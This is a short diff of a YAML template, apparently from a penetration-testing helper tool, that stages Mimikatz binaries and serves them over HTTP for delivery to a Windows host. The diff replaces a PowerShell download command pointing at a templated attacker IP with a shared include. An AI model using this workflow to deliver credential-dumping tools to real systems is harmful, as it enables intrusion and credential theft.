@@ -7,10 +7,5 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; bash -c 'cp -n {{ tools_dir }}/mimikatz/x64/* packstation/outbound/'; \
-  printf '%s\n' '================================================================'; \
-  printf '%s\n' '                      -----PowerShell-----                      '; \
-  printf '%s\n' 'Deliver: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/mimikatz.exe -Outfile {{ delivery_path_windows }}\mimikatz.exe'; \
-  printf '%s\n' '================================================================'; \
-  printf '%s\n' '                         -----CMD-----                          '; \
-  printf '%s\n' '================================================================'; \
+  {{ include('partials/download-windows', filename='mimikatz.exe') }} \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
